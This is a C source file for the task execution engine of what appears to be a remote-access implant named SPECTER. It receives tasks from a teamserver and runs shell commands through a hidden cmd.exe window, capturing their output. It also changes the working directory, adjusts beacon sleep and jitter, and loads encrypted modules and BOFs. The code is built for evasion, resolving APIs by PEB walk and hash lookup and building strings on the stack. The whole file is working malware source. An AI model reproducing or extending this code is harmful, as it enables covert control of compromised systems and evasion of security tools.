/**
 * SPECTER Implant — Task Execution Engine
 *
 * Dispatches and executes tasks received from the teamserver.
 * Currently implements TASK_CMD_EXEC (shell command via cmd.exe).
 *
 * All API resolution via PEB walk + DJB2 hash — no static imports.
 * All strings built on the stack — no string literals in .rodata.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "config.h"
#include "task_exec.h"
#include "heap.h"
#include "bus.h"

/* ------------------------------------------------------------------ */
/*  Dev build trace support                                            */
/* ------------------------------------------------------------------ */

#ifdef SPECTER_DEV_BUILD
static void task_dev_trace(const char *msg) {
    typedef void (__attribute__((ms_abi)) *fn_Dbg)(const char *);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return;
    fn_Dbg dbg = (fn_Dbg)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
    if (dbg) dbg(msg);
}
#define TASK_TRACE(msg) task_dev_trace(msg)
#else
#define TASK_TRACE(msg) ((void)0)
#endif

/* ------------------------------------------------------------------ */
/*  Task type string parser                                            */
/* ------------------------------------------------------------------ */

/**
 * Compare a length-delimited buffer against a stack-built string.
 * Returns TRUE if they match (case-insensitive ASCII).
 */
static BOOL streq_n(const char *buf, DWORD buf_len, const char *cmp) {
    DWORD i = 0;
    while (cmp[i] != '\0') {
        if (i >= buf_len) return FALSE;
        char a = buf[i];
        char b = cmp[i];
        /* Lowercase both */
        if (a >= 'A' && a <= 'Z') a += 0x20;
        if (b >= 'A' && b <= 'Z') b += 0x20;
        if (a != b) return FALSE;
        i++;
    }
    return (i == buf_len);
}

DWORD parse_task_type(const char *type_str, DWORD len) {
    /* Build comparison strings on the stack — no .rodata literals */

    /* Built-in tasks */
    char s_sleep[]       = {'s','l','e','e','p',0};
    char s_kill[]        = {'k','i','l','l',0};
    char s_exit[]        = {'e','x','i','t',0};
    char s_cd[]          = {'c','d',0};
    char s_pwd[]         = {'p','w','d',0};

    /* Legacy inline tasks */
    char s_shell[]       = {'s','h','e','l','l',0};
    char s_cmd[]         = {'c','m','d',0};

    /* Module bus tasks */
    char s_module_load[] = {'m','o','d','u','l','e','_','l','o','a','d',0};
    char s_bof_load[]    = {'b','o','f','_','l','o','a','d',0};
    char s_bof[]         = {'b','o','f',0};

    /* Built-in */
    if (streq_n(type_str, len, s_sleep))       return TASK_TYPE_SLEEP;
    if (streq_n(type_str, len, s_kill))        return TASK_TYPE_KILL;
    if (streq_n(type_str, len, s_exit))        return TASK_TYPE_KILL;
    if (streq_n(type_str, len, s_cd))          return TASK_TYPE_CD;
    if (streq_n(type_str, len, s_pwd))         return TASK_TYPE_PWD;

    /* Legacy inline */
    if (streq_n(type_str, len, s_shell))       return TASK_TYPE_CMD;
    if (streq_n(type_str, len, s_cmd))         return TASK_TYPE_CMD;

    /* Module bus */
    if (streq_n(type_str, len, s_module_load)) return TASK_TYPE_MODULE;
    if (streq_n(type_str, len, s_bof_load))    return TASK_TYPE_BOF;
    if (streq_n(type_str, len, s_bof))         return TASK_TYPE_BOF;

    return 0;
}

/* ------------------------------------------------------------------ */
/*  Helper: store a task result                                        */
/* ------------------------------------------------------------------ */

static void store_task_result(IMPLANT_CONTEXT *ctx, const char *task_id,
                              DWORD status, BYTE *data, DWORD data_len) {
    if (ctx->task_result_count >= MAX_TASK_RESULTS) {
        /* Result queue full — drop oldest to make room */
        if (ctx->task_results[0].data) {
            task_free(ctx->task_results[0].data);
        }
        /* Shift results left */
        for (DWORD i = 0; i < MAX_TASK_RESULTS - 1; i++) {
            ctx->task_results[i] = ctx->task_results[i + 1];
        }
        ctx->task_result_count = MAX_TASK_RESULTS - 1;
    }

    TASK_RESULT *r = &ctx->task_results[ctx->task_result_count];
    spec_memset(r, 0, sizeof(TASK_RESULT));
    /* Copy task_id (up to 63 chars + null) */
    DWORD id_len = spec_strlen(task_id);
    if (id_len > 63) id_len = 63;
    spec_memcpy(r->task_id, task_id, id_len);
    r->task_id[id_len] = 0;
    r->status = status;
    r->data = data;
    r->data_len = data_len;
    ctx->task_result_count++;
}

/* ------------------------------------------------------------------ */
/*  Heap allocation via kernel32 HeapAlloc (PEB-resolved)              */
/* ------------------------------------------------------------------ */

/* task_alloc / task_free now delegate to the cached heap (heap.c).
   This avoids a PEB walk + export lookup on every allocation. */

PVOID task_alloc(DWORD size) {
    return heap_alloc_cached(size);
}

void task_free(PVOID ptr) {
    heap_free_cached(ptr);
}

/* ------------------------------------------------------------------ */
/*  TASK_CMD_EXEC — Execute shell command via cmd.exe                  */
/* ------------------------------------------------------------------ */

/**
 * Execute a command string via cmd.exe /c <command>.
 * Creates an anonymous pipe for stdout/stderr capture.
 * Reads output into a heap-allocated buffer (up to TASK_OUTPUT_MAX).
 */
static void task_cmd_exec(IMPLANT_CONTEXT *ctx, TASK *task) {
    TASK_TRACE("[SPECTER] task_cmd_exec: enter");

    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) {
        store_task_result(ctx, task->task_id, 1, NULL, 0);
        return;
    }

    /* Resolve required APIs */
    fn_CreateProcessA pCreateProcess = (fn_CreateProcessA)find_export_by_hash(k32, HASH_CREATEPROCESSA);
    fn_CreatePipe pCreatePipe = (fn_CreatePipe)find_export_by_hash(k32, HASH_CREATEPIPE);
    fn_ReadFile pReadFile = (fn_ReadFile)find_export_by_hash(k32, HASH_READFILE);
    fn_CloseHandle pCloseHandle = (fn_CloseHandle)find_export_by_hash(k32, HASH_CLOSEHANDLE);
    fn_WaitForSingleObject pWait = (fn_WaitForSingleObject)find_export_by_hash(k32, HASH_WAITFORSINGLEOBJ);

    if (!pCreateProcess || !pCreatePipe || !pReadFile || !pCloseHandle || !pWait) {
        TASK_TRACE("[SPECTER] task_cmd_exec: API resolution failed");
        store_task_result(ctx, task->task_id, 1, NULL, 0);
        return;
    }

    /* Create anonymous pipe for stdout capture */
    HANDLE hReadPipe = INVALID_HANDLE_VALUE;
    HANDLE hWritePipe = INVALID_HANDLE_VALUE;

    SECURITY_ATTRIBUTES sa;
    spec_memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!pCreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        TASK_TRACE("[SPECTER] task_cmd_exec: CreatePipe failed");
        store_task_result(ctx, task->task_id, 1, NULL, 0);
        return;
    }

    /* Build command line: "cmd.exe /c <command>"
       All strings on the stack — no .rodata literals */
    char cmd_prefix[] = {'c','m','d','.','e','x','e',' ','/','c',' ',0};
    DWORD prefix_len = 11; /* strlen("cmd.exe /c ") */
    DWORD cmd_total = prefix_len + task->data_len + 1;

    /* Cap at reasonable size */
    if (cmd_total > 4096) cmd_total = 4096;

    char *cmdline = (char *)task_alloc(cmd_total);
    if (!cmdline) {
        TASK_TRACE("[SPECTER] task_cmd_exec: alloc cmdline failed");
        pCloseHandle(hReadPipe);
        pCloseHandle(hWritePipe);
        store_task_result(ctx, task->task_id, 1, NULL, 0);
        return;
    }

    spec_memcpy(cmdline, cmd_prefix, prefix_len);
    DWORD copy_len = task->data_len;
    if (prefix_len + copy_len >= cmd_total) {
        copy_len = cmd_total - prefix_len - 1;
    }
    spec_memcpy(cmdline + prefix_len, task->data, copy_len);
    cmdline[prefix_len + copy_len] = 0;

    /* Set up STARTUPINFO to redirect stdout and stderr to our pipe */
    STARTUPINFOA si;
    spec_memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;

    PROCESS_INFORMATION pi;
    spec_memset(&pi, 0, sizeof(pi));

    /* Create the process */
    BOOL created = pCreateProcess(
        NULL,               /* lpApplicationName */
        cmdline,            /* lpCommandLine */
        NULL,               /* lpProcessAttributes */
        NULL,               /* lpThreadAttributes */
        TRUE,               /* bInheritHandles */
        CREATE_NO_WINDOW,   /* dwCreationFlags */
        NULL,               /* lpEnvironment */
        NULL,               /* lpCurrentDirectory */
        &si,                /* lpStartupInfo */
        &pi                 /* lpProcessInformation */
    );

    /* Close write end of pipe — child has it, we only read */
    pCloseHandle(hWritePipe);
    hWritePipe = INVALID_HANDLE_VALUE;

    if (!created) {
        TASK_TRACE("[SPECTER] task_cmd_exec: CreateProcess failed");
        pCloseHandle(hReadPipe);
        task_free(cmdline);
        store_task_result(ctx, task->task_id, 1, NULL, 0);
        return;
    }

    /* Read output from pipe into heap buffer */
    BYTE *output_buf = (BYTE *)task_alloc(TASK_OUTPUT_MAX);
    DWORD total_read = 0;

    if (output_buf) {
        DWORD bytes_read = 0;
        while (total_read < TASK_OUTPUT_MAX) {
            DWORD to_read = TASK_OUTPUT_MAX - total_read;
            if (to_read > 4096) to_read = 4096;

            BOOL ok = pReadFile(hReadPipe, output_buf + total_read,
                                to_read, &bytes_read, NULL);
            if (!ok || bytes_read == 0)
                break;
            total_read += bytes_read;
        }
    }

    /* Wait for process to exit (with timeout) */
    pWait(pi.hProcess, TASK_WAIT_TIMEOUT_MS);

    /* Cleanup handles */
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);
    pCloseHandle(hReadPipe);
    task_free(cmdline);

    /* Store result */
    if (output_buf && total_read > 0) {
        /* Shrink buffer to actual size to save memory */
        BYTE *result = (BYTE *)task_alloc(total_read);
        if (result) {
            spec_memcpy(result, output_buf, total_read);
            task_free(output_buf);
            store_task_result(ctx, task->task_id, 0, result, total_read);
        } else {
            /* Use the oversized buffer directly */
            store_task_result(ctx, task->task_id, 0, output_buf, total_read);
        }
    } else {
        if (output_buf) task_free(output_buf);
        /* No output — still mark as complete */
        store_task_result(ctx, task->task_id, 0, NULL, 0);
    }

    TASK_TRACE("[SPECTER] task_cmd_exec: done");
}

/* ------------------------------------------------------------------ */
/*  Built-in: handle sleep task                                        */
/* ------------------------------------------------------------------ */

/**
 * Parse sleep task data.
 * Accepts ASCII text ("60" or "60 15") from Web UI / TUI,
 * or binary LE u32 + u8 from raw task payloads.
 * Always tries ASCII first to avoid misinterpreting ASCII bytes as u32.
 */
static void handle_sleep_task(IMPLANT_CONTEXT *ctx, TASK *task) {
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg || !task->data || task->data_len == 0) {
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* Always try ASCII parsing first: "60" or "60 15" */
    DWORD interval = 0;
    DWORD jitter = 0;
    DWORD i = 0;
    BOOL is_ascii = FALSE;

    /* Check if first byte is an ASCII digit */
    if (task->data[0] >= '0' && task->data[0] <= '9') {
        is_ascii = TRUE;
        /* Parse interval */
        while (i < task->data_len && task->data[i] >= '0' && task->data[i] <= '9') {
            interval = interval * 10 + (task->data[i] - '0');
            i++;
        }
        /* Skip whitespace */
        while (i < task->data_len && (task->data[i] == ' ' || task->data[i] == '\t'))
            i++;
        /* Parse optional jitter */
        while (i < task->data_len && task->data[i] >= '0' && task->data[i] <= '9') {
            jitter = jitter * 10 + (task->data[i] - '0');
            i++;
        }
    }

    if (is_ascii && interval > 0) {
        cfg->sleep_interval = interval;
        if (jitter > 0 && jitter <= 100)
            cfg->jitter_percent = jitter;
    } else if (task->data_len >= 4) {
        /* Binary fallback: [u32 LE interval_secs][u8 jitter_percent] */
        interval = (DWORD)task->data[0] |
                   ((DWORD)task->data[1] << 8) |
                   ((DWORD)task->data[2] << 16) |
                   ((DWORD)task->data[3] << 24);
        if (interval > 0)
            cfg->sleep_interval = interval;
        if (task->data_len >= 5)
            cfg->jitter_percent = (DWORD)task->data[4];
    }

    /* Build result string: "interval=30s jitter=15%" */
    {
        char result[64];
        DWORD rpos = 0;
        /* "interval=" */
        char s_interval[] = {'i','n','t','e','r','v','a','l','=',0};
        for (DWORD k = 0; s_interval[k]; k++) result[rpos++] = s_interval[k];
        /* Convert interval to string */
        char num[12];
        DWORD nlen = 0;
        DWORD val = cfg->sleep_interval;
        if (val == 0) { num[nlen++] = '0'; }
        else { char tmp[12]; DWORD tlen = 0; while (val > 0) { tmp[tlen++] = '0' + (val % 10); val /= 10; } for (DWORD k = tlen; k > 0; k--) num[nlen++] = tmp[k-1]; }
        for (DWORD k = 0; k < nlen; k++) result[rpos++] = num[k];
        result[rpos++] = 's';
        result[rpos++] = ' ';
        /* "jitter=" */
        char s_jitter[] = {'j','i','t','t','e','r','=',0};
        for (DWORD k = 0; s_jitter[k]; k++) result[rpos++] = s_jitter[k];
        val = cfg->jitter_percent;
        nlen = 0;
        if (val == 0) { num[nlen++] = '0'; }
        else { char tmp[12]; DWORD tlen = 0; while (val > 0) { tmp[tlen++] = '0' + (val % 10); val /= 10; } for (DWORD k = tlen; k > 0; k--) num[nlen++] = tmp[k-1]; }
        for (DWORD k = 0; k < nlen; k++) result[rpos++] = num[k];
        result[rpos++] = '%';
        result[rpos] = 0;
        store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, (BYTE*)result, rpos);
    }
}

/* ------------------------------------------------------------------ */
/*  Built-in: handle cd (change directory) task                        */
/* ------------------------------------------------------------------ */

static void handle_cd_task(IMPLANT_CONTEXT *ctx, TASK *task) {
    if (!task->data || task->data_len == 0) {
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* Resolve SetCurrentDirectoryA from kernel32 via PEB walk */
    typedef BOOL (__attribute__((ms_abi)) *fn_SetCurrentDirectoryA)(const char *);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) {
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* DJB2("SetCurrentDirectoryA") */
    #define HASH_SETCURRENTDIRECTORYA 0x2037D0EA
    fn_SetCurrentDirectoryA pSetDir = (fn_SetCurrentDirectoryA)
        find_export_by_hash(k32, HASH_SETCURRENTDIRECTORYA);
    if (!pSetDir) {
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* Ensure null-terminated path */
    char path_buf[512];
    DWORD copy = task->data_len;
    if (copy > sizeof(path_buf) - 1) copy = sizeof(path_buf) - 1;
    spec_memcpy(path_buf, task->data, copy);
    path_buf[copy] = 0;

    BOOL ok = pSetDir(path_buf);
    if (!ok) {
        char err[] = {'d','i','r','e','c','t','o','r','y',' ','n','o','t',' ','f','o','u','n','d',0};
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, (BYTE*)err, 19);
    } else {
        store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
    }
}

/* ------------------------------------------------------------------ */
/*  Built-in: handle pwd (print working directory) task                */
/* ------------------------------------------------------------------ */

static void handle_pwd_task(IMPLANT_CONTEXT *ctx, TASK *task) {
    typedef DWORD (__attribute__((ms_abi)) *fn_GetCurrentDirectoryA)(DWORD, char *);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) {
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* DJB2("GetCurrentDirectoryA") */
    #define HASH_GETCURRENTDIRECTORYA 0x8E61A45E
    fn_GetCurrentDirectoryA pGetDir = (fn_GetCurrentDirectoryA)
        find_export_by_hash(k32, HASH_GETCURRENTDIRECTORYA);
    if (!pGetDir) {
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    char dir_buf[512];
    DWORD len = pGetDir(sizeof(dir_buf), dir_buf);
    if (len > 0 && len < sizeof(dir_buf)) {
        BYTE *result = (BYTE *)task_alloc(len);
        if (result) {
            spec_memcpy(result, dir_buf, len);
            store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, result, len);
        } else {
            store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        }
    } else {
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
    }
}

/* ------------------------------------------------------------------ */
/*  Module bus: execute module/BOF task via bus subsystem               */
/* ------------------------------------------------------------------ */

/**
 * Execute a module task via the module bus subsystem.
 * The task data is a MODULE_PACKAGE blob (signed + encrypted).
 * Flow: verify -> decrypt -> load (PIC/COFF) -> guardian thread -> output.
 *
 * For synchronous execution: wait up to GUARDIAN_DEFAULT_TIMEOUT for
 * completion, then drain output into a task result.
 */
static void execute_module_task(IMPLANT_CONTEXT *ctx, TASK *task) {
    if (!task->data || task->data_len == 0) {
        TASK_TRACE("[SPECTER] execute_module_task: no data");
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* Get the module manager from the bus context */
    BUS_CONTEXT *bctx = (BUS_CONTEXT *)ctx->module_bus;
    if (!bctx || !bctx->initialized) {
        TASK_TRACE("[SPECTER] execute_module_task: bus not initialized");
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* Get the global module manager via accessor */
    MODULE_MANAGER *mgr = modmgr_get();
    if (!mgr || !mgr->initialized) {
        TASK_TRACE("[SPECTER] execute_module_task: modmgr not initialized");
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* Determine the package data — for module_load tasks, the task args
     * contain the full MODULE_PACKAGE blob, possibly followed by a 0x00
     * separator and user arguments (appended by the server). */
    const BYTE *package = task->data;
    DWORD package_len = task->data_len;

    /* Check for user args separator: the server appends \0 + user_args
     * after the module package. The package has MODULE_PACKAGE_HDR at
     * the start, so we can compute the expected package size from the
     * header's encrypted_size field. */
    const MODULE_PACKAGE_HDR *hdr = loader_parse_header(package, package_len);
    if (!hdr) {
        TASK_TRACE("[SPECTER] execute_module_task: invalid package header");
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* The actual package is header + encrypted payload */
    DWORD actual_pkg_len = sizeof(MODULE_PACKAGE_HDR) + hdr->encrypted_size;
    if (actual_pkg_len > package_len) {
        TASK_TRACE("[SPECTER] execute_module_task: package truncated");
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* Execute via modmgr — this handles verify, decrypt, load, guardian */
    int slot = modmgr_execute(mgr, package, actual_pkg_len);

    if (slot < 0) {
        TASK_TRACE("[SPECTER] execute_module_task: modmgr_execute failed");
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        return;
    }

    /* Wait for module to complete (blocking, with timeout).
     * The guardian thread runs the module — we wait here so we can
     * collect output and return it as a task result in this cycle. */
    LOADED_MODULE *mod = &mgr->slots[slot];
    guardian_wait(mod, GUARDIAN_DEFAULT_TIMEOUT);

    /* Drain output from the module's output ring */
    BYTE output_buf[TASK_OUTPUT_MAX];
    DWORD drained = 0;

    if (mod->output_ring) {
        drained = output_drain(mod->output_ring, output_buf, TASK_OUTPUT_MAX);
    }

    /* Determine result status */
    DWORD result_status = TASK_STATUS_COMPLETE;
    if (mod->status == MODULE_STATUS_CRASHED) {
        result_status = TASK_STATUS_FAILED;
    } else if (mod->status == MODULE_STATUS_RUNNING) {
        /* Still running after timeout — kill it */
        guardian_kill(mod);
        result_status = TASK_STATUS_FAILED;
    }

    /* Store result with output data */
    if (drained > 0) {
        BYTE *result_data = (BYTE *)task_alloc(drained);
        if (result_data) {
            spec_memcpy(result_data, output_buf, drained);
            store_task_result(ctx, task->task_id, result_status,
                              result_data, drained);
        } else {
            store_task_result(ctx, task->task_id, result_status, NULL, 0);
        }
    } else {
        store_task_result(ctx, task->task_id, result_status, NULL, 0);
    }

    /* Clean up the module slot */
    modmgr_cleanup(mgr, (DWORD)slot);

    TASK_TRACE("[SPECTER] execute_module_task: done");
}

/* ------------------------------------------------------------------ */
/*  Task dispatcher                                                    */
/* ------------------------------------------------------------------ */

void execute_task(IMPLANT_CONTEXT *ctx, TASK *task) {
    if (!ctx || !task) return;

    switch (task->task_type) {
    /* ---- Built-in tasks (no bus) ---- */
    case TASK_TYPE_SLEEP:
        handle_sleep_task(ctx, task);
        break;

    case TASK_TYPE_KILL:
        ctx->running = FALSE;
        store_task_result(ctx, task->task_id, TASK_STATUS_COMPLETE, NULL, 0);
        break;

    case TASK_TYPE_CD:
        handle_cd_task(ctx, task);
        break;

    case TASK_TYPE_PWD:
        handle_pwd_task(ctx, task);
        break;

    /* ---- Legacy inline task ---- */
    case TASK_TYPE_CMD:
        task_cmd_exec(ctx, task);
        break;

    /* ---- Module bus tasks ---- */
    case TASK_TYPE_MODULE:
    case TASK_TYPE_BOF:
        execute_module_task(ctx, task);
        break;

    default:
        /* Unknown or unimplemented task type — report failure.
           Shellcode, upload, and download are handled via modules (bus). */
        store_task_result(ctx, task->task_id, TASK_STATUS_FAILED, NULL, 0);
        break;
    }
}

/* ------------------------------------------------------------------ */
/*  Cleanup helpers                                                    */
/* ------------------------------------------------------------------ */

void task_free_pending(IMPLANT_CONTEXT *ctx) {
    if (!ctx) return;
    for (DWORD i = 0; i < ctx->pending_task_count; i++) {
        if (ctx->pending_tasks[i].data) {
            task_free(ctx->pending_tasks[i].data);
            ctx->pending_tasks[i].data = NULL;
        }
    }
    ctx->pending_task_count = 0;
}

void task_free_results(IMPLANT_CONTEXT *ctx) {
    if (!ctx) return;
    for (DWORD i = 0; i < ctx->task_result_count; i++) {
        if (ctx->task_results[i].data) {
            task_free(ctx->task_results[i].data);
            ctx->task_results[i].data = NULL;
        }
    }
    ctx->task_result_count = 0;
}
